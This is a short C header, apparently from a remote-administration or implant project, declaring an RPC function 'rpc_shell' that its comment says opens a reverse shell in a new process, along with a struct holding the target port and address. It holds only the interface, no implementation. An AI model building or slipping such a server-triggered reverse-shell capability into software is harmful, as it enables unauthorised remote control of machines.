// #include <stdio.h>
// #include <sys/socket.h>
// #include <netinet/ip.h>
// #include <arpa/inet.h>
// #include <unistd.h>

#include "socket.h"
#include "rpc/stub/rpc_stub.h"

/**
 * @brief This is an RPC function, this function is used to connect to a reverse shell in new process.
 * 
 * @param rpc The message the server sent. 
 * @return int The return error 0 on success negative 1 on failure.
 */
struct Result rpc_shell(const struct RPC rpc);

/**
 * @brief The shell struct, used to save the arguments for the shell function. 
 * 
 */
struct RPCShell {
    int function_id; // reserve the bytes.
    // from now on the arguments segment starts.
    int port;
    char address[4096 - 2*sizeof(int)];
};
